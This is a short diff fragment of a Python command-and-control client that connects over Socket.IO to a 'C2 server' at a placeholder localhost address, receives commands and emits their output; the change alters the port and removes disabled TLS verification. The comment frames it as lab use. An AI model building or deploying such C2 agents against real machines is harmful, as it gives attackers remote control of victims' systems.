@@ -34,5 +34,5 @@ def on_command(cmd):
     sio.emit('output', result)
 
 # Connect to the C2 server (replace 127.0.0.1 with actual IP)
-sio.connect('https://127.0.0.1:443', verify=False)  # SSL warning ignored for protected/lab use
+sio.connect('https://127.0.0.1:5000')
 sio.wait()
